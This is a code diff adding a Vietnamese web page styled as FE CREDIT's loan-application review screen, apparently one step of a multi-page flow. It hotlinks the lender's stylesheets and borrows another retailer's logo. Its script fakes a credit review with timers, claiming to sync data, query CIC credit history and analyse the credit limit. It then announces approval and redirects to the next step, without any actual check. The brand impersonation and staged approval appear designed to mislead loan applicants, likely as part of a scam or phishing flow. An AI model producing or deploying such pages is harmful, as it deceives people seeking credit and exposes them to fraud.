@@ -1,0 +1,805 @@
+
+<!DOCTYPE html>
+<html dir="ltr" lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover"
+    />
+    <title>FE CREDIT - Đang xét duyệt hồ sơ - VAY TIÊU DÙNG TÍN CHẤP</title>
+
+    <!-- ============================================
+         EXTERNAL RESOURCES
+         - FE CREDIT CSS Bundles
+         - Bootstrap 5.3
+         - Font Awesome 6.4
+         - Inter Font (Neobank Style)
+         ============================================ -->
+    
+    <!-- FE CREDIT External CSS Bundles -->
+    <link
+      href="https://www.fecredit.com.vn/sb/sitebuilder-ltr-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen"
+      rel="stylesheet"
+    />
+    <link
+      href="https://www.fecredit.com.vn/sb/sitebuilder-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen"
+      rel="stylesheet"
+    />
+    <link
+      href="https://www.fecredit.com.vn/sb/sitebuilder-css-small-header-01-sm-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen and (min-width:0) and (max-width:991px)"
+      rel="stylesheet"
+    />
+    <link
+      href="https://www.fecredit.com.vn/sb/sitebuilder-css-large-header-07-lg-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen and (min-width:992px)"
+      rel="stylesheet"
+    />
+    <link
+      href="https://www.fecredit.com.vn/sb/css-customs-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen"
+      rel="stylesheet"
+    />
+    <link
+      href="https://www.fecredit.com.vn/sb/css-footer-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
+      media="screen"
+      rel="stylesheet"
+    />
+
+    <!-- Bootstrap 5.3 -->
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    
+    <!-- Font Awesome 6.4 -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    
+    <!-- Inter Font (Neobank Style) -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://thuvienvector.vn/wp-content/uploads/2025/08/dien-may-xanh-logo-png.jpg" />
+
+    <!-- FECredit Design System (Local) -->
+    <link rel="stylesheet" href="unified-design-system.css" />
+    <link rel="stylesheet" href="mobile-accessibility.css" />
+    <link rel="stylesheet" href="step1-style-guide.css" />
+
+    <!-- CryptoJS for localStorage encryption (if needed) -->
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+
+    <!-- ============================================
+         NEOBANK STYLE CSS - MOBILE FIRST
+         Design: Modern Digital Bank Aesthetic
+         Uses FECredit Design System from step1-style-guide.css
+         ============================================ -->
+    <style>
+      /* ============================================
+         CSS VARIABLES - EXTENDED DESIGN TOKENS
+         Base variables from step1-style-guide.css
+         These extend the design system for step4 specific needs
+         ============================================ */
+      :root {
+        /* Extended Colors (complementing --fecredit-* from design system) */
+        --fecredit-primary-glow: rgba(0, 153, 79, 0.25);
+        --fecredit-success: #10b981;
+        --fecredit-success-bg: #d1fae5;
+        --fecredit-soft-green: #e8f5e9;
+        --fecredit-bg-page: #f8fafc;
+        --fecredit-bg-card: #ffffff;
+        --fecredit-text-main: #111827;
+        --fecredit-text-muted: #6b7280;
+        --fecredit-text-light: #9ca3af;
+        
+        /* Extended Design Tokens */
+        --fecredit-radius-pill: 9999px;
+        --fecredit-shadow-soft: 0 10px 40px rgba(0, 0, 0, 0.08);
+        --fecredit-shadow-card: 0 20px 60px rgba(0, 0, 0, 0.12);
+        
+        /* Animation Timings */
+        --fecredit-anim-fast: 0.2s;
+        --fecredit-anim-normal: 0.4s;
+        --fecredit-anim-slow: 0.8s;
+      }
+
+      /* ============================================
+         RESET & BASE STYLES
+         ============================================ */
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        width: 100%;
+        max-width: 100%;
+        overflow-x: hidden;
+        font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Roboto, sans-serif;
+        font-size: var(--fecredit-font-size-base);
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        background-color: var(--fecredit-bg-page);
+        color: var(--fecredit-text-main);
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        min-height: 100dvh; /* Dynamic viewport height for mobile */
+      }
+
+      /* ============================================
+         HEADER - TOP BAR
+         ============================================ */
+      .fe-topbar {
+        width: 100%;
+        background-color: var(--fecredit-bg-card);
+        box-shadow: var(--fecredit-shadow-sm);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .fe-topbar-inner {
+        max-width: 960px;
+        margin: 0 auto;
+        padding: var(--fecredit-space-3) var(--fecredit-space-4);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--fecredit-space-3);
+      }
+
+      .fe-topbar-logo {
+        display: flex;
+        align-items: center;
+      }
+
+      .fe-topbar-logo img {
+        height: 28px;
+        width: auto;
+      }
+
+      .fe-topbar-actions {
+        display: flex;
+        align-items: center;
+        gap: var(--fecredit-space-2);
+      }
+
+      .fe-topbar-icon-btn {
+        width: 40px;
+        height: 40px;
+        border: none;
+        background: transparent;
+        border-radius: var(--fecredit-radius-pill);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--fecredit-text-muted);
+        cursor: pointer;
+        transition: background-color var(--fecredit-anim-fast) ease;
+      }
+
+      .fe-topbar-icon-btn:hover,
+      .fe-topbar-icon-btn:focus {
+        background-color: var(--fecredit-soft-green);
+        color: var(--fecredit-primary);
+      }
+
+      .fe-topbar-icon-btn i {
+        font-size: 1.1rem;
+      }
+
+      /* ============================================
+         MAIN CONTENT - APPROVAL SCREEN
+         ============================================ */
+      .approval-page {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: var(--fecredit-space-6) var(--fecredit-space-4);
+        min-height: calc(100vh - 120px);
+        min-height: calc(100dvh - 120px);
+      }
+
+      .approval-card {
+        width: 100%;
+        max-width: 420px;
+        background: var(--fecredit-bg-card);
+        border-radius: var(--fecredit-radius-xl);
+        box-shadow: var(--fecredit-shadow-card);
+        padding: var(--fecredit-space-8) var(--fecredit-space-6);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* Subtle gradient accent at top of card */
+      .approval-card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, var(--fecredit-primary), var(--fecredit-primary-light));
+      }
+
+      @media (min-width: 576px) {
+        .approval-card {
+          padding: 40px var(--fecredit-space-8);
+        }
+      }
+
+      /* ============================================
+         RADAR ANIMATION CONTAINER
+         ============================================ */
+      .radar-container {
+        position: relative;
+        width: 160px;
+        height: 160px;
+        margin: 0 auto var(--fecredit-space-6);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* Radar Scanning Waves */
+      .radar-wave {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border: 2px solid var(--fecredit-primary);
+        border-radius: var(--fecredit-radius-full);
+        opacity: 0;
+        animation: radar-pulse 2.5s ease-out infinite;
+      }
+
+      .radar-wave:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .radar-wave:nth-child(2) {
+        animation-delay: 0.6s;
+      }
+      .radar-wave:nth-child(3) {
+        animation-delay: 1.2s;
+      }
+
+      @keyframes radar-pulse {
+        0% {
+          transform: scale(0.5);
+          opacity: 0.8;
+        }
+        100% {
+          transform: scale(1.4);
+          opacity: 0;
+        }
+      }
+
+      /* Center Icon Circle */
+      .radar-center {
+        position: relative;
+        width: 100px;
+        height: 100px;
+        background: linear-gradient(135deg, var(--fecredit-primary) 0%, var(--fecredit-primary-dark) 100%);
+        border-radius: var(--fecredit-radius-full);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 
+          0 8px 30px var(--fecredit-primary-glow),
+          0 0 0 8px rgba(0, 153, 79, 0.1);
+        z-index: 2;
+      }
+
+      .radar-center i {
+        font-size: 2.5rem;
+        color: var(--fecredit-white);
+      }
+
+      /* Success State - When complete */
+      .radar-container.is-complete .radar-wave {
+        animation: none;
+        opacity: 0;
+      }
+
+      .radar-container.is-complete .radar-center {
+        background: linear-gradient(135deg, var(--fecredit-success) 0%, #059669 100%);
+        animation: success-bounce 0.5s ease;
+      }
+
+      @keyframes success-bounce {
+        0%, 100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+      }
+
+      /* ============================================
+         STATUS TEXT - PROCESSING STEPS
+         ============================================ */
+      .status-title {
+        font-size: var(--fecredit-font-size-xl);
+        font-weight: var(--fecredit-font-weight-bold);
+        color: var(--fecredit-text-main);
+        margin-bottom: var(--fecredit-space-2);
+      }
+
+      .status-message {
+        font-size: var(--fecredit-font-size-sm);
+        color: var(--fecredit-text-muted);
+        min-height: var(--fecredit-touch-target);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: opacity var(--fecredit-anim-fast) ease;
+      }
+
+      .status-message.fade-out {
+        opacity: 0;
+      }
+
+      /* Typing Dots Animation */
+      .typing-dots {
+        display: inline-flex;
+        gap: var(--fecredit-space-1);
+        margin-left: var(--fecredit-space-2);
+      }
+
+      .typing-dots span {
+        width: 6px;
+        height: 6px;
+        background-color: var(--fecredit-primary);
+        border-radius: var(--fecredit-radius-full);
+        animation: typing-bounce 1.2s infinite ease-in-out;
+      }
+
+      .typing-dots span:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .typing-dots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .typing-dots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      @keyframes typing-bounce {
+        0%, 60%, 100% {
+          transform: translateY(0);
+        }
+        30% {
+          transform: translateY(-6px);
+        }
+      }
+
+      /* Success Message State */
+      .status-message.is-success {
+        color: var(--fecredit-success);
+        font-weight: var(--fecredit-font-weight-semibold);
+      }
+
+      .status-message.is-success i {
+        margin-right: var(--fecredit-space-2);
+        font-size: 1.1rem;
+      }
+
+      /* ============================================
+         PROGRESS STEPS INDICATOR
+         ============================================ */
+      .progress-steps {
+        display: flex;
+        justify-content: center;
+        gap: var(--fecredit-space-2);
+        margin-top: var(--fecredit-space-6);
+        padding-top: var(--fecredit-space-5);
+        border-top: 1px solid var(--fecredit-border-light);
+      }
+
+      .progress-step {
+        width: 10px;
+        height: 10px;
+        border-radius: var(--fecredit-radius-full);
+        background-color: var(--fecredit-border-light);
+        transition: all var(--fecredit-anim-normal) ease;
+      }
+
+      .progress-step.is-active {
+        background-color: var(--fecredit-primary);
+        transform: scale(1.2);
+      }
+
+      .progress-step.is-complete {
+        background-color: var(--fecredit-success);
+      }
+
+      /* ============================================
+         SECURITY NOTE
+         ============================================ */
+      .security-note {
+        margin-top: var(--fecredit-space-5);
+        padding: var(--fecredit-space-3) var(--fecredit-space-4);
+        background: linear-gradient(135deg, #f0fdf4 0%, #ecfdf5 100%);
+        border-radius: var(--fecredit-radius-lg);
+        border: 1px solid rgba(0, 153, 79, 0.15);
+        display: flex;
+        align-items: center;
+        gap: var(--fecredit-space-3);
+        font-size: var(--fecredit-font-size-xs);
+        color: var(--fecredit-primary-dark);
+        text-align: left;
+      }
+
+      .security-note i {
+        font-size: var(--fecredit-font-size-lg);
+        color: var(--fecredit-primary);
+        flex-shrink: 0;
+      }
+
+      /* ============================================
+         FOOTER
+         ============================================ */
+      .fe-footer {
+        width: 100%;
+        padding: var(--fecredit-space-4);
+        text-align: center;
+        font-size: var(--fecredit-font-size-xs);
+        color: var(--fecredit-text-light);
+        background-color: var(--fecredit-bg-page);
+      }
+
+      .fe-footer a {
+        color: var(--fecredit-primary);
+        text-decoration: none;
+      }
+
+      .fe-footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* ============================================
+         ACCESSIBILITY UTILITIES
+         ============================================ */
+      .visually-hidden {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+      }
+
+      /* Focus visible for keyboard navigation */
+      :focus-visible {
+        outline: 2px solid var(--fecredit-primary);
+        outline-offset: 2px;
+      }
+
+      /* Reduce motion for users who prefer it */
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- ============================================
+         HEADER - TOP BAR WITH LOGO
+         ============================================ -->
+    <header class="fe-topbar" role="banner">
+      <div class="fe-topbar-inner">
+        <!-- Logo -->
+        <div class="fe-topbar-logo">
+          <a href="/" aria-label="Trang chủ FE CREDIT">
+            <img
+              src="https://thuvienvector.vn/wp-content/uploads/2025/08/dien-may-xanh-logo-png.jpg"
+              alt="FE CREDIT"
+              loading="eager"
+            />
+          </a>
+        </div>
+        
+        <!-- Action Buttons -->
+        <div class="fe-topbar-actions">
+          <button
+            class="fe-topbar-icon-btn"
+            type="button"
+            aria-label="Tìm kiếm"
+          >
+            <i class="fa-solid fa-magnifying-glass" aria-hidden="true"></i>
+          </button>
+          <button
+            class="fe-topbar-icon-btn"
+            type="button"
+            aria-label="Mở menu điều hướng"
+          >
+            <i class="fa-solid fa-bars" aria-hidden="true"></i>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <!-- ============================================
+         MAIN CONTENT - APPROVAL ANIMATION
+         ============================================ -->
+    <main class="approval-page" role="main">
+      <article 
+        class="approval-card"
+        role="status"
+        aria-live="polite"
+        aria-atomic="true"
+        aria-label="Trạng thái xét duyệt hồ sơ"
+      >
+        <!-- Radar Animation Container -->
+        <div 
+          id="radarContainer" 
+          class="radar-container"
+          aria-hidden="true"
+        >
+          <!-- Radar Waves (Scanning Effect) -->
+          <div class="radar-wave"></div>
+          <div class="radar-wave"></div>
+          <div class="radar-wave"></div>
+          
+          <!-- Center Icon (Shield/Document) -->
+          <div class="radar-center">
+            <i id="centerIcon" class="fa-solid fa-shield-halved"></i>
+          </div>
+        </div>
+
+        <!-- Status Title -->
+        <h1 id="statusTitle" class="status-title">
+          Đang xét duyệt hồ sơ
+        </h1>
+
+        <!-- Dynamic Status Message -->
+        <p id="statusMessage" class="status-message">
+          <span id="statusText">Đang đồng bộ dữ liệu</span>
+          <span class="typing-dots" id="typingDots">
+            <span></span>
+            <span></span>
+            <span></span>
+          </span>
+        </p>
+
+        <!-- Progress Steps Indicator -->
+        <div class="progress-steps" role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuemax="4" aria-valuetext="Bước 1 trong 4: Đồng bộ dữ liệu">
+          <div id="step1" class="progress-step is-active" aria-label="Bước 1: Đồng bộ dữ liệu"></div>
+          <div id="step2" class="progress-step" aria-label="Bước 2: Tra cứu CIC"></div>
+          <div id="step3" class="progress-step" aria-label="Bước 3: Phân tích hạn mức"></div>
+          <div id="step4" class="progress-step" aria-label="Bước 4: Hoàn tất"></div>
+        </div>
+
+        <!-- Security Note -->
+        <div class="security-note">
+          <i class="fa-solid fa-lock" aria-hidden="true"></i>
+          <span>Thông tin của bạn được bảo mật theo tiêu chuẩn ngân hàng</span>
+        </div>
+
+        <!-- Screen reader announcement -->
+        <div id="srAnnouncement" class="visually-hidden" aria-live="assertive"></div>
+      </article>
+    </main>
+
+    <!-- ============================================
+         FOOTER
+         ============================================ -->
+    <footer class="fe-footer" role="contentinfo">
+      <p>© 2024 <a href="https://www.fecredit.com.vn">FE CREDIT</a>. Tất cả các quyền được bảo lưu.</p>
+    </footer>
+
+    <!-- ============================================
+         JAVASCRIPT - APPROVAL SIMULATION LOGIC
+         Tổng thời gian: ~7 giây
+         - Giai đoạn 1: 1.5 giây
+         - Giai đoạn 2: 2 giây
+         - Giai đoạn 3: 2 giây
+         - Giai đoạn 4: 1.5 giây (hiển thị thành công rồi chuyển trang)
+         ============================================ -->
+    <script>
+      // =====================================================================
+      // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+      // =====================================================================
+      // Lưu vị trí hiện tại ngay khi trang tải
+      localStorage.setItem('currentStep', 'step4.html');
+
+      (function() {
+        'use strict';
+
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        var radarContainer = document.getElementById('radarContainer');
+        var centerIcon = document.getElementById('centerIcon');
+        var statusTitle = document.getElementById('statusTitle');
+        var statusMessage = document.getElementById('statusMessage');
+        var statusText = document.getElementById('statusText');
+        var typingDots = document.getElementById('typingDots');
+        var srAnnouncement = document.getElementById('srAnnouncement');
+        
+        // Progress steps
+        var steps = [
+          document.getElementById('step1'),
+          document.getElementById('step2'),
+          document.getElementById('step3'),
+          document.getElementById('step4')
+        ];
+
+        // ============================================
+        // CONFIGURATION - PROCESSING STAGES
+        // Mô phỏng quy trình ngân hàng thực tế
+        // ============================================
+        var stages = [
+          {
+            message: 'Đang đồng bộ dữ liệu',
+            duration: 1500, // 1.5 giây
+            icon: 'fa-solid fa-shield-halved'
+          },
+          {
+            message: 'Đang tra cứu lịch sử tín dụng (CIC)',
+            duration: 2000, // 2 giây
+            icon: 'fa-solid fa-database'
+          },
+          {
+            message: 'Đang phân tích hạn mức khả dụng',
+            duration: 2000, // 2 giây
+            icon: 'fa-solid fa-chart-line'
+          },
+          {
+            message: 'Hồ sơ hợp lệ!',
+            duration: 1500, // 1.5 giây trước khi chuyển trang
+            icon: 'fa-solid fa-check',
+            isComplete: true
+          }
+        ];
+
+        var currentStage = 0;
+
+        // ============================================
+        // UPDATE UI FUNCTION
+        // Cập nhật giao diện theo từng giai đoạn
+        // ============================================
+        function updateUI(stageIndex) {
+          var stage = stages[stageIndex];
+          
+          // Update icon with transition
+          centerIcon.className = stage.icon;
+
+          // Update status message with fade effect
+          statusMessage.classList.add('fade-out');
+          
+          setTimeout(function() {
+            statusText.textContent = stage.message;
+            
+            // Handle completion state
+            if (stage.isComplete) {
+              // Hide typing dots, show success
+              typingDots.style.display = 'none';
+              statusMessage.classList.add('is-success');
+              
+              // Use safe DOM manipulation instead of innerHTML to prevent XSS
+              statusMessage.textContent = ''; // Clear existing content
+              var checkIcon = document.createElement('i');
+              checkIcon.className = 'fa-solid fa-circle-check';
+              checkIcon.setAttribute('aria-hidden', 'true');
+              var messageSpan = document.createElement('span');
+              messageSpan.textContent = stage.message;
+              statusMessage.appendChild(checkIcon);
+              statusMessage.appendChild(messageSpan);
+              
+              // Update title
+              statusTitle.textContent = 'Xét duyệt thành công!';
+              
+              // Add complete class to radar
+              radarContainer.classList.add('is-complete');
+            }
+            
+            statusMessage.classList.remove('fade-out');
+          }, 200);
+
+          // Update progress steps
+          steps.forEach(function(step, index) {
+            step.classList.remove('is-active', 'is-complete');
+            
+            if (index < stageIndex) {
+              step.classList.add('is-complete');
+            } else if (index === stageIndex) {
+              step.classList.add('is-active');
+            }
+          });
+
+          // Update progress bar aria values
+          var progressBar = document.querySelector('.progress-steps');
+          if (progressBar) {
+            progressBar.setAttribute('aria-valuenow', stageIndex + 1);
+            progressBar.setAttribute('aria-valuetext', 'Bước ' + (stageIndex + 1) + ' trong 4: ' + stage.message);
+          }
+
+          // Announce to screen readers
+          srAnnouncement.textContent = stage.message;
+        }
+
+        // ============================================
+        // RUN SIMULATION
+        // Chạy quy trình mô phỏng xét duyệt
+        // ============================================
+        function runSimulation() {
+          // Store duration before any changes to currentStage
+          var currentDuration = stages[currentStage].duration;
+          
+          // Initial stage already shown, proceed to next stages
+          if (currentStage < stages.length - 1) {
+            setTimeout(function() {
+              currentStage++;
+              updateUI(currentStage);
+              runSimulation();
+            }, currentDuration);
+          } else {
+            // All stages complete - redirect to step5.html
+            setTimeout(function() {
+              // Chuyển hướng sang step5.html sau khi hoàn tất
+              try {
+                window.location.href = 'step5.html';
+              } catch (error) {
+                console.error('Navigation failed:', error);
+                alert('Không thể chuyển trang. Vui lòng thử lại.');
+              }
+            }, currentDuration);
+          }
+        }
+
+        // ============================================
+        // INITIALIZE
+        // Khởi tạo và bắt đầu simulation
+        // ============================================
+        function init() {
+          // Show initial stage
+          updateUI(0);
+          
+          // Start the simulation process
+          runSimulation();
+        }
+
+        // Start when DOM is ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', init);
+        } else {
+          init();
+        }
+
+      })();
+    </script>
+  </body>
+</html>
+
+
